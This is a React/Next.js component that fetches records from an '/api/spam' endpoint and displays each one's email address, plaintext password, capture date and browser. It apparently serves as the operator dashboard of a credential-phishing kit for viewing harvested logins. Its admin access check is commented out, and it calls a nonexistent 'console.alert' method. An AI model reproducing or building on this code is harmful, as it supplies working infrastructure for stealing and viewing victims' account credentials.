import { useState, useEffect, useContext, useRef } from "react";
import AuthContext from "../../context/auth";
import { useRouter } from 'next/router';
import axios from "axios";
import styles from "./dash.module.css";

function Dash() {
  const [data, setData] = useState([]);
  const [limitNr, setLimitNr] = useState(1);
  const mounted = useRef(false);
  const [reqStatus, changeReqStatus] = useState(false);

  const router = useRouter();
  const { user } = useContext(AuthContext);

  // useEffect(() => {
  //   if(!user) {
  //     router.replace('/admin');
    // }
  // }, [])

  function handleMore() {
    return
//     if(reqStatus) return;
//     setLimitNr(prev => prev + 1);
  }

  useEffect(() => {
    if(!mounted.current) {
      mounted.current = true;
      (async function() {
        try {
          const res = await axios.get(`${process.env.NEXT_PUBLIC_URL}/api/spam`);
  
          setData(res.data);  
        } catch (error) {
          console.alert(error.response.data);
        }
      })();    
    }
  }, [])


//   useEffect(() => {
//     if(limitNr > 1) {
//       (async function() {
//         try {
//           const res = await axios.get(`${process.env.NEXT_PUBLIC_URL}/api/spam?limit=${limitNr}`);

//           if(!res.data.length) {
//             changeReqStatus(true);
//           }

//           setData(prev => ([...res.data, ...prev]));
//         } catch (error) {
//           console.alert(error.response.data);
//         }
//       })();
//     }
//   }, [limitNr])
  
  return (  
    <div className={styles.container}>
      <button disabled={reqStatus} onClick={handleMore}>show</button>
      <hr/>
      <hr/>
      {data.map(e => <div  className={styles.element} key={e._id}>
          <span>Email: {e.email}</span>  
          <span>Pass: {e.password}</span>  
          <span>Data: {Date(e.createdAt)}</span>
          <span>Browser: {e.browser}</span>
          <hr/>
        </div>)}
    </div>
  )
}

export default Dash;
